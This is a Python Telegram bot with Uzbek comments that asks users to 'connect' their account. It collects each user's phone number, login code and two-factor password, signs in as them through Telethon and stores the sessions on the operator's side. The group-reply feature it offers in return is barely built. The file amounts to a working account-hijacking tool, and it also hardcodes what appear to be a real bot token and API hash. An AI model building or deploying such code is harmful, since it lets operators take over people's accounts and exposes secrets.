import asyncio
import logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

# AIOGRAM VA TELEGRAM API SOZLAMALARI
BOT_TOKEN = "8751865013:AAHqEWU3ygRg5mA4Wd1gYNaQEZB0UFaMRUw"
API_ID = 34760616  # my.telegram.org saytidan olingan API ID
API_HASH = "1bea40adc634f0205e907f0a1873e7b8"  # my.telegram.org saytidan olingan API HASH
ADMIN_ID = 7651404790  # Sizning Telegram ID'ingiz

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Ma'lumotlarni saqlash (Bazalar o'rniga vaqtinchalik)
phrases = []  # Boshida gaplar yo'q
sessions = {} # Telethon mijozlari xotirasi

# FSM (Holatlar)
class AccountConnect(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

class AdminStates(StatesGroup):
    waiting_for_phrase = State()

# ----------------- TUGMALAR -----------------
def get_user_keyboard():
    kb = [
        [KeyboardButton(text="📱 Akkauntni ulash")]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_admin_keyboard():
    kb = [
        [InlineKeyboardButton(text="📊 Statistika", callback_data="stats")],
        [InlineKeyboardButton(text="➕ Gap qo'shish", callback_data="add_phrase")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

# ----------------- COMMAND HANDLERS -----------------
@dp.message(Command("start"))
async def start_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "Xush kelibsiz! Akkauntni ulash uchun pastdagi tugmani bosing:",
        reply_markup=get_user_keyboard()
    )

@dp.message(Command("admin"))
async def admin_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("🔑 **Admin Panel:**", reply_markup=get_admin_keyboard(), parse_mode="Markdown")

# ----------------- ADMIN PANEL HANDLERS -----------------
@dp.callback_query(F.data == "stats")
async def show_stats(call: types.CallbackQuery):
    msg = f"📊 **Statistika:**\n\n" \
          f"🔹 Ulangan akkauntlar: {len(sessions)}\n" \
          f"🔹 Baza mavjud gaplar: {len(phrases)}"
    await call.message.edit_text(msg, reply_markup=get_admin_keyboard(), parse_mode="Markdown")

@dp.callback_query(F.data == "add_phrase")
async def add_phrase_start(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.waiting_for_phrase)
    await call.message.answer("Yangi gapni matn ko'rinishida yuboring:")

@dp.message(AdminStates.waiting_for_phrase)
async def save_phrase(message: types.Message, state: FSMContext):
    phrases.append(message.text)
    await state.clear()
    await message.answer(f"✅ Gap saqlandi: `{message.text}`\n\nJami gaplar: {len(phrases)} ta.", reply_markup=get_admin_keyboard())

# ----------------- AKKAUNT ULASH (TELETHON) -----------------
@dp.message(F.text == "📱 Akkauntni ulash")
async def start_connect(message: types.Message, state: FSMContext):
    await state.set_state(AccountConnect.waiting_for_phone)
    await message.answer(
        "Iltimos, telefon raqamingizni xalqaro formatda yuboring.\n"
        "Masalan: `+998978002727`",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )

@dp.message(AccountConnect.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    if not phone.startswith("+"):
        await message.answer("❌ Raqam `+` belgisi bilan boshlanishi kerak! Masalan: `+998978002727`\nQaytadan kiriting:")
        return

    # Telethon klientini yaratish
    session_name = f"sessions/user_{message.from_user.id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()

    try:
        res = await client.send_code_request(phone)
        await state.update_data(phone=phone, phone_code_hash=res.phone_code_hash, client=client)
        await state.set_state(AccountConnect.waiting_for_code)
        await message.answer("📩 SMS/Telegram kodingiz yuborildi.\nIltimos, kelgan kodni kiriting:")
    except Exception as e:
        await message.answer(f"❌ Xatolik yuz berdi: {e}\nQayta urinib ko'ring /start.")
        await client.disconnect()
        await state.clear()

@dp.message(AccountConnect.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    client: TelegramClient = data['client']

    try:
        await client.sign_in(phone=data['phone'], code=code, phone_code_hash=data['phone_code_hash'])
        sessions[message.from_user.id] = client
        await message.answer("✅ Akkauntingiz muvaffaqiyatli ulandi va guruhlarda ishlashga tayyor!", reply_markup=get_user_keyboard())
        await state.clear()
    except SessionPasswordNeededError:
        await state.set_state(AccountConnect.waiting_for_2fa)
        await message.answer("🔐 Akkauntingizda 2-bosqichli xavfsizlik (2FA) paroli o'rnatilgan.\nParolingizni kiriting:")
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await message.answer("❌ Kiritilgan kod noto'g'ri yoki muddati o'tgan. Qaytadan kiriting:")

@dp.message(AccountConnect.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client: TelegramClient = data['client']

    try:
        await client.sign_in(password=password)
        sessions[message.from_user.id] = client
        await message.answer("✅ Akkauntingiz muvaffaqiyatli ulandi!", reply_markup=get_user_keyboard())
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Noto'g'ri parol: {e}\nQaytadan kiriting:")

# ----------------- GURUHLARDA ISHLASH -----------------
@dp.message(F.chat.type.in_({"group", "supergroup"}))
async def handle_group_messages(message: types.Message):
    # Guruhlarda javob qaytarish mantig'i
    if phrases:
        # Baza gaplar mavjud bo'lsa javob beradi
        import random
        reply_text = random.choice(phrases)
        # Zarur bo'lsa ulangan userbot orqali yoki botning o'zidan javob yuborish mumkin:
        # await message.reply(reply_text)
        pass

async def main():
    import os
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
